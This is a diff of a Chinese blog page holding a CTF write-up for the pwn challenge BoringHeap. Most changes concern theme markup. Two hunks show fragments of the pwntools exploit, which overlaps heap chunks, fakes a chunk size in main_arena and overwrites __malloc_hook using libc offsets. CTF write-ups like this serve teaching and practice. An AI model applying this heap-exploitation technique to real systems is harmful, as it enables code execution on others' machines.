@@ -5,20 +5,21 @@
   
   <title>2019上海市大学生网络安全大赛-线上赛-pwn-BoringHeap Writeup - 广莫之野</title>
   <meta charset="UTF-8">
+  <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
   <meta name="description" content="2019上海市大学生网络安全大赛 线上赛pwn题BoringHeap的解题过程">
-<meta name="keywords" content="pwn,ctf">
+<meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2019上海市大学生网络安全大赛-线上赛-pwn-BoringHeap Writeup">
 <meta property="og:url" content="http://shiroinu.top/2019/11/16/sh2019boringheap/index.html">
 <meta property="og:site_name" content="广莫之野">
 <meta property="og:description" content="2019上海市大学生网络安全大赛 线上赛pwn题BoringHeap的解题过程">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-11-17T08:11:11.225Z">
+<meta property="og:updated_time" content="2019-12-05T14:01:20.813Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="2019上海市大学生网络安全大赛-线上赛-pwn-BoringHeap Writeup">
 <meta name="twitter:description" content="2019上海市大学生网络安全大赛 线上赛pwn题BoringHeap的解题过程">
@@ -27,42 +28,53 @@
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
+  
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1574048167625">
+  <link rel="stylesheet" href="/css/style.css?v=1575554516921">
 </head>
 
 <body class="mdui-drawer-body-left">
   
-  <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+  <div id="nexmoe-background">
+    <div class="nexmoe-bg" style="background-image: url(/images/back1.png)"></div>
+    <div class="mdui-appbar mdui-shadow-0">
+      <div class="mdui-toolbar">
+        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">menu</i></a>
+        <div class="mdui-toolbar-spacer"></div>
+        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+        <a href="/" title="tsts" class="mdui-btn mdui-btn-icon"><img src="/images/head_2.png"></a>
+       </div>
+    </div>
+  </div>
   <div id="nexmoe-header">
       <div class="nexmoe-drawer mdui-drawer" id="drawer">
     <div class="nexmoe-avatar mdui-ripple">
-        <a href="/">
-            <img src="/images/head_2.png">
+        <a href="/" title="tsts">
+            <img src="/images/head_2.png" alt="tsts">
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>12</div>
+        <div><span>文章</span>13</div>
         <div><span>标签</span>2</div>
         <div><span>分类</span>0</div>
     </div>
     <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="回到首页">
             <i class="mdui-list-item-icon nexmoefont icon-home"></i>
             <div class="mdui-list-item-content">
                 回到首页
             </div>
         </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about.html" title="关于博客">
             <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
             <div class="mdui-list-item-content">
                 关于博客
             </div>
         </a>
         
-        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html">
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/PY.html" title="我的朋友">
             <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
             <div class="mdui-list-item-content">
                 我的朋友
@@ -75,11 +87,9 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">社交按钮</h3>
     <div class="nexmoe-widget nexmoe-social">
-        
         <a class="mdui-ripple" href="https://github.com/killthatshaman/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
             <i class="nexmoefont icon-github"></i>
         </a>
-        
     </div>
 </div>
   
@@ -89,9 +99,10 @@
   
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">标签云</h3>
-    <div class="nexmoe-widget tagcloud">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud">
       <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
     </div>
+    
   </div>
 
   
@@ -99,7 +110,7 @@
   <div class="nexmoe-widget-wrap">
     <h3 class="nexmoe-widget-title">文章归档</h3>
     <div class="nexmoe-widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li></ul>
     </div>
   </div>
 
@@ -112,47 +123,9 @@
         & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
     </div>
 </div><!-- .nexmoe-drawer -->
-
-<script>
-    const getRealPath = (pathname, desc = false) => {
-        if (!pathname) {
-            pathname = window.location.pathname
-        }
-        let names = pathname.split("/")
-        if (desc === false) {
-            for (let i = names.length - 1; i >= 0; --i) {
-                let name = names[i].trim()
-                if (name.length > 0 && name !== "/" && name !== "index.html") {
-                    return name
-                }
-            }
-        } else {
-            for (let i = 0; i < names.length; ++i) {
-                let name = names[i].trim()
-                if (name.length > 0 && name !== "/" && name !== "index.html") {
-                    return name
-                }
-            }
-        }
-        return "/"
-    }
-    let links = document.querySelectorAll('.nexmoe-list-item');
-    let rootRealPath = getRealPath(window.location.pathname, true);
-    for (let link of links) {
-        let linkPath = link.getAttribute("href");
-        if (linkPath && getRealPath(linkPath, true) === rootRealPath) {
-            link.className = "active nexmoe-list-item mdui-list-item mdui-ripple";
-        }
-    }
-</script>
   </div>
   <div id="nexmoe-content">
     <div class="nexmoe-primary">
-        <div class="nexmoe-tab">
-            <a mdui-drawer="{target: '#drawer', swipe: true}">
-              <i class="mdui-icon material-icons">menu</i>
-            </a>
-          </div>
         <div class="nexmoe-post">
     <div class="nexmoe-post-cover"> 
         
@@ -205,8 +178,9 @@ def edit(index,offset,content):
     sh.sendline(str(offset))
     sh.recvuntil(&#39;Input Content:&#39;)
     sh.sendline(content)
-    sh.recvuntil(&#39;5.Exit&#39;)</code></pre>
-<pre><code class="python">def delete(index):
+    sh.recvuntil(&#39;5.Exit&#39;)
+
+def delete(index):
     sh.sendline(&#39;3&#39;)
     sh.recvuntil(&#39;Which one do you want to delete?&#39;)
     sh.sendline(str(index))
@@ -237,8 +211,9 @@ add(3,&#39;aaa&#39;) #6 堆重叠 地址同 [2]
 add(2,&#39;bbb&#39;) #7 同[3]
 delete(3) 
 edit(7,0,p64(0x51)) 
-add(2,&#39;ccc&#39;) # 将fake_size = 0x51置入main_arena</code></pre>
-<pre><code class="python">delete(2)
+add(2,&#39;ccc&#39;) # 将fake_size = 0x51置入main_arena
+
+delete(2)
 edit(6,0,p64(libc_base + 0x3c4b20 + 0x10)) # main_arena
 add(3,&#39;aaa&#39;)
 add_full_content(3,p64(0) * 7 + p64(libc_base + 0x3c4b10 - 0x10)) #malloc_hook
@@ -248,6 +223,10 @@ sh.sendline(&#39;1&#39;)
 sh.interactive()</code></pre>
 
   </article>
+  
+    
+
+  
   <section class="nexmoe-comment">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
 <div id="gitalk"></div>
@@ -280,8 +259,11 @@ sh.interactive()</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1574048167539"></script>
+<script src="/js/app.js?v=1575554516924"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+
+
 
   
 
